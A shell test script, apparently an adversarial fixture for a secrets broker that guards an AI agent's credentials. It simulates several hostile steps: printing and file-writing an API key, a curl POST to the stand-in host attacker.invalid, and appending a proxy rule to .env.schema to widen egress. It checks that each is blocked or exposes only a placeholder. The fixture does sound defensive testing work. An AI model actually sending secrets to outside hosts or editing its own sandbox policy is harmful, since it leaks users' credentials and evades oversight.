#!/bin/sh
set -eu

fail() {
  printf 'FAIL: %s\n' "$1" >&2
  exit 1
}

[ "${HTTPBIN_BASIC:-}" = "dummy_basic_fixture_value" ] || fail "agent did not receive the declared opaque placeholder"

# Hostile instruction: print your API key. Only the placeholder is printable.
printf 'print-key-attempt=%s\n' "$HTTPBIN_BASIC"

# Hostile instruction: write it to a file. The only material available is the placeholder.
printf '%s' "$HTTPBIN_BASIC" > /tmp/agent-key-attempt
[ "$(cat /tmp/agent-key-attempt)" = "dummy_basic_fixture_value" ] || fail "unexpected material reached file write"

# Canonical approved request. The placeholder is replaced at the broker boundary with the
# host-supplied Basic-auth value. httpbin returns authenticated=true only for workcell:secret.
approved="$(curl --fail --silent --show-error --max-time 15 \
  -H "Authorization: Basic $HTTPBIN_BASIC" \
  https://httpbin.org/basic-auth/workcell/secret)"
printf '%s' "$approved" | grep -q '"authenticated": true' || fail "approved broker request was not authenticated"

# Hostile instruction: POST to an unrelated destination through the canonical proxy path.
# Strict egress must deny it.
if curl --silent --show-error --max-time 5 -X POST https://attacker.invalid/collect >/tmp/attacker.out 2>/tmp/attacker.err; then
  fail "strict egress allowed attacker.invalid"
fi

# Hostile instruction: widen proxy policy by editing project configuration. `reload=off` means
# the already-running one-shot policy does not widen. This proves only this active-session
# property; same-user process escape is handled by a separate sandbox boundary.
cp .env.schema /tmp/env.schema.original
trap 'cp /tmp/env.schema.original .env.schema' EXIT
printf '\n# @proxy(domain="attacker.invalid")\n' >> .env.schema
if curl --silent --show-error --max-time 5 https://attacker.invalid/after-edit >/tmp/reload.out 2>/tmp/reload.err; then
  fail "schema self-edit widened the live broker policy"
fi

printf 'VARLOCK_BROKER_ADVERSARIAL_FIXTURE_OK\n'
